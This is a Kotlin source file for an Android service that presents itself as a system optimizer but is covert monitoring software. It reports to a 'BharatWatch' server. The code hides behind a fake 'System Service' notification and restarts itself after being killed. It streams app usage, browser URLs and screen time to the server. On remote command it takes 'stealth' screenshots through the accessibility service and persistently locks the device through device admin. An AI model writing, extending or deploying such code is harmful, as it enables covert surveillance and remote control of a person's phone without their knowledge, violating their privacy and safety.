package com.system.optimizer.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import com.system.optimizer.Config
import com.system.optimizer.admin.AdminReceiver
import com.system.optimizer.monitor.AppUsageTracker
import com.system.optimizer.monitor.BrowserTracker
import com.system.optimizer.monitor.ProcessMonitor
import com.system.optimizer.monitor.ScreenshotCapture
import com.system.optimizer.network.WebSocketManager
import org.json.JSONObject

/**
 * Core foreground service that runs in the background and:
 *   • Maintains a WebSocket connection to the BharatWatch server
 *   • Sends periodic heartbeats (battery, current app, screen state)
 *   • Reports running apps every 30 seconds
 *   • Reports screen time every 5 minutes
 *   • Captures screenshots on command
 *   • Locks/unlocks the device on command
 *   • Auto-restarts if killed
 *
 * Appears as "System Service — Optimizing system performance..." in notifications.
 */
class MonitoringService : Service() {

    private val TAG = "MonitoringService"

    private lateinit var wsManager: WebSocketManager
    private lateinit var appTracker: AppUsageTracker
    private lateinit var processMonitor: ProcessMonitor
    private lateinit var screenshotCapture: ScreenshotCapture

    private val handler = Handler(Looper.getMainLooper())
    private var lastEventCheckTime = System.currentTimeMillis()

    companion object {
        @Volatile
        var isPersistentLocked = false
    }

    private val screenLockReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (isPersistentLocked && context != null) {
                try {
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(context, AdminReceiver::class.java)
                    if (dpm.isAdminActive(admin)) {
                        dpm.lockNow()
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private val persistentLockTask = object : Runnable {
        override fun run() {
            if (isPersistentLocked) {
                try {
                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                    if (pm.isInteractive) {
                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        val admin = ComponentName(this@MonitoringService, AdminReceiver::class.java)
                        if (dpm.isAdminActive(admin)) {
                            dpm.lockNow()
                        }
                    }
                } catch (_: Exception) {}
            }
            handler.postDelayed(this, 1000)
        }
    }

    // ═══════════════════════════════════════════
    //  Periodic task runnables
    // ═══════════════════════════════════════════

    private val heartbeatTask = object : Runnable {
        override fun run() {
            sendHeartbeat()
            handler.postDelayed(this, Config.HEARTBEAT_INTERVAL)
        }
    }

    private val appReportTask = object : Runnable {
        override fun run() {
            reportRunningApps()
            reportUsageEvents()
            handler.postDelayed(this, Config.APP_REPORT_INTERVAL)
        }
    }

    private val screenTimeTask = object : Runnable {
        override fun run() {
            reportScreenTime()
            handler.postDelayed(this, Config.SCREEN_TIME_INTERVAL)
        }
    }

    // ═══════════════════════════════════════════
    //  Service lifecycle
    // ═══════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")

        appTracker = AppUsageTracker(this)
        processMonitor = ProcessMonitor(this)
        screenshotCapture = ScreenshotCapture(this)

        wsManager = WebSocketManager(
            onMessage = { handleServerCommand(it) },
            onConnected = {
                Log.i(TAG, "Connected to BharatWatch server")
                // Send initial data burst
                sendHeartbeat()
                reportRunningApps()
                reportScreenTime()
            },
            onDisconnected = {
                Log.w(TAG, "Disconnected from server — will auto-reconnect")
            }
        )

        // Wire up BrowserTracker → WebSocket for web activity reporting
        BrowserTracker.onWebActivity = { domain, url, durationSeconds, visitId ->
            Log.i(TAG, "🌐 Web: $domain (${durationSeconds}s) [visit: $visitId]")
            wsManager.sendWebActivity(domain, url, durationSeconds, visitId)
        }

        try {
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(screenLockReceiver, filter)
        } catch (_: Exception) {}
        handler.postDelayed(persistentLockTask, 1000)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Service started (START_STICKY)")

        // Create notification channel and go foreground with MediaProjection type on Android 10+
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                    Config.NOTIFICATION_ID,
                    buildNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } catch (e: Exception) {
                startForeground(Config.NOTIFICATION_ID, buildNotification())
            }
        } else {
            startForeground(Config.NOTIFICATION_ID, buildNotification())
        }

        // Only start MediaProjection on Android < 11 (Android 11+ uses stealth takeScreenshot via AccessibilityService with ZERO screencast icons!)
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            val resultCode = intent?.getIntExtra("resultCode", -999) ?: -999
            @Suppress("DEPRECATION")
            val projData = intent?.getParcelableExtra<Intent>("projectionData")
            if (resultCode == Activity.RESULT_OK && projData != null) {
                screenshotCapture.stop()
                screenshotCapture.startProjection(resultCode, projData)
                Log.i(TAG, "MediaProjection initialized successfully for Android < 11")
            }
        }

        // Connect to server
        wsManager.connect()

        // Start periodic reporting
        handler.post(heartbeatTask)
        handler.postDelayed(appReportTask, 5_000)
        handler.postDelayed(screenTimeTask, 10_000)

        // Persist enabled state
        getSharedPreferences("bw_prefs", MODE_PRIVATE)
            .edit().putBoolean("service_enabled", true).apply()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.i(TAG, "Service destroyed")
        handler.removeCallbacks(heartbeatTask)
        handler.removeCallbacks(appReportTask)
        handler.removeCallbacks(screenTimeTask)
        wsManager.disconnect()
        screenshotCapture.stop()
        super.onDestroy()
    }

    /**
     * If the user swipes the app away, schedule a restart via AlarmManager.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.i(TAG, "Task removed — scheduling restart")
        val restartIntent = Intent(applicationContext, MonitoringService::class.java)
        val pi = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pi)
        super.onTaskRemoved(rootIntent)
    }

    // ═══════════════════════════════════════════
    //  Notification (stealth appearance)
    // ═══════════════════════════════════════════

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Config.NOTIFICATION_CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background optimization"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, Config.NOTIFICATION_CHANNEL_ID)
            .setContentTitle(Config.SERVICE_NOTIFICATION_TITLE)
            .setContentText(Config.SERVICE_NOTIFICATION_TEXT)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    // ═══════════════════════════════════════════
    //  Handle commands from server
    // ═══════════════════════════════════════════

    private fun handleServerCommand(msg: JSONObject) {
        if (msg.optString("type") != "command") return

        val command = msg.optString("command")
        val cmdId = msg.optString("id")
        Log.i(TAG, "📥 Command: $command (id: $cmdId)")

        when (command) {
            "screenshot" -> handleScreenshot(cmdId)
            "lock" -> handleLock(cmdId)
            "unlock" -> handleUnlock(cmdId)
        }
    }

    private fun handleScreenshot(cmdId: String) {
        // Step 1: Try 100% stealth screenshot via AccessibilityService first (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && BrowserTracker.instance != null) {
            BrowserTracker.captureStealthBase64(this) { base64 ->
                if (base64 != null && base64.length > 2500) {
                    wsManager.sendScreenshot(base64, cmdId)
                    Log.i(TAG, "📸 Stealth screenshot sent to server via AccessibilityService")
                } else {
                    Log.w(TAG, "Stealth screenshot empty or blank (${base64?.length ?: 0} chars), falling back to MediaProjection")
                    // Fallback to MediaProjection if stealth capture failed or returned black/blank image
                    captureViaMediaProjection(cmdId)
                }
            }
            return
        }

        captureViaMediaProjection(cmdId)
    }

    private fun captureViaMediaProjection(cmdId: String) {
        if (!screenshotCapture.isActive()) {
            wsManager.sendCommandResult(cmdId, false, "MediaProjection not active. Re-open the app to grant permission.")
            return
        }

        screenshotCapture.capture { base64 ->
            if (base64 != null) {
                wsManager.sendScreenshot(base64, cmdId)
                Log.i(TAG, "📸 Screenshot sent to server")
            } else {
                wsManager.sendCommandResult(cmdId, false, "Screenshot capture failed")
            }
        }
    }

    private fun handleLock(cmdId: String) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                isPersistentLocked = true
                dpm.lockNow()
                wsManager.sendCommandResult(cmdId, true, "Device locked persistently until unlock command is executed")
                Log.i(TAG, "🔒 Device locked persistently")
            } else {
                wsManager.sendCommandResult(cmdId, false, "Device admin not active")
            }
        } catch (e: Exception) {
            wsManager.sendCommandResult(cmdId, false, "Lock failed: ${e.message}")
        }
    }

    private fun handleUnlock(cmdId: String) {
        try {
            isPersistentLocked = false
            // We can't truly unlock (requires user PIN/fingerprint)
            // But we CAN wake the screen so they see the lock screen
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK
                        or PowerManager.ACQUIRE_CAUSES_WAKEUP
                        or PowerManager.ON_AFTER_RELEASE,
                "bharatwatch:wake"
            )
            wl.acquire(5_000L)
            wl.release()
            wsManager.sendCommandResult(cmdId, true, "Persistent lock disabled — screen turned on")
            Log.i(TAG, "🔓 Screen turned on and persistent lock disabled")
        } catch (e: Exception) {
            wsManager.sendCommandResult(cmdId, false, "Unlock failed: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════
    //  Periodic data reporting
    // ═══════════════════════════════════════════

    private fun sendHeartbeat() {
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

            val foreground = appTracker.getCurrentForegroundApp()
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            val screenOn = pm.isInteractive

            wsManager.sendHeartbeat(
                battery = battery,
                currentApp = foreground?.first,
                currentPackage = foreground?.second,
                screenOn = screenOn
            )
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat error: ${e.message}")
        }
    }

    private fun reportRunningApps() {
        try {
            val apps = processMonitor.getRunningApps()
            wsManager.sendApps(apps)
        } catch (e: Exception) {
            Log.e(TAG, "App report error: ${e.message}")
        }
    }

    private fun reportUsageEvents() {
        try {
            val events = appTracker.getRecentEvents(lastEventCheckTime)
            lastEventCheckTime = System.currentTimeMillis()

            for (event in events) {
                wsManager.sendActivity(
                    appName = event["appName"] as String,
                    packageName = event["packageName"] as String,
                    eventType = event["eventType"] as String
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Event report error: ${e.message}")
        }
    }

    private fun reportScreenTime() {
        try {
            val screenTime = appTracker.getTodayScreenTime()
            wsManager.sendScreenTimeUpdate(screenTime)
        } catch (e: Exception) {
            Log.e(TAG, "Screen time report error: ${e.message}")
        }
    }
}
